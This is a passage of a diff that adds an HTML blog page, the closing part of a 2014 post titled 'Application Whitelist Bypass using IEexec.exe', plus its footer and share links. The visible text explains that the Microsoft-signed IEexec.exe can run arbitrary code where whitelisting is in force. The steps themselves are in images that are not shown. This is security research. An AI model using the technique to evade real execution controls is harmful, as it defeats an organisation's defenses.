+        data-sizes="auto"
+        alt="/images/2014/201401_whitelisting_1.png"
+        title="/images/2014/201401_whitelisting_1.png" /></p>
+<p>Now, on the same host&hellip;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/2014/201401_whitelisting_2.png"
+        data-srcset="/images/2014/201401_whitelisting_2.png, /images/2014/201401_whitelisting_2.png 1.5x, /images/2014/201401_whitelisting_2.png 2x"
+        data-sizes="auto"
+        alt="/images/2014/201401_whitelisting_2.png"
+        title="/images/2014/201401_whitelisting_2.png" /></p>
+<p>Executes just fine!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/2014/201401_whitelisting_3.png"
+        data-srcset="/images/2014/201401_whitelisting_3.png, /images/2014/201401_whitelisting_3.png 1.5x, /images/2014/201401_whitelisting_3.png 2x"
+        data-sizes="auto"
+        alt="/images/2014/201401_whitelisting_3.png"
+        title="/images/2014/201401_whitelisting_3.png" /></p>
+<p>Its important to distinguish what this technique is and what it is not. This is not an exploit or vulnerability. Rather this is one way to execute arbitraty code in an Application Whitelisting Environment.</p>
+<p><strong>Summary:</strong></p>
+<p>In this document we learned that even if a host is in a mode where only trusted approved applications can run. IEexec.exe can be used in certain situations to circumvent a Whitelist, since it is likely a trusted binary, since it is signed by Microsoft.</p>
+<p>Cheers,</p>
+<p>=&gt; <a href="https://twitter.com/subTee" target="_blank" rel="noopener noreffer ">@subTee</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2014-01-16</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/" data-title="Application Whitelist Bypass using IEexec.exe" data-via="mubix" data-hashtags="whitelisting,ieexec"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/" data-hashtag="whitelisting"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/" data-title="Application Whitelist Bypass using IEexec.exe"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/" data-title="Application Whitelist Bypass using IEexec.exe"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/" data-title="Application Whitelist Bypass using IEexec.exe"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/" data-title="Application Whitelist Bypass using IEexec.exe"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/whitelisting/">whitelisting</a>,&nbsp;<a href="/tags/ieexec/">ieexec</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/" class="prev" rel="prev" title="Installing Metasploit Community Edition on Windows 8"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Installing Metasploit Community Edition on Windows 8</a>
+            <a href="/posts/2014/2014-01-18-attacker-ghost-stories-shmoocon-2014/" class="next" rel="next" title="Attacker Ghost Stories - ShmooCon 2014">Attacker Ghost Stories - ShmooCon 2014<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
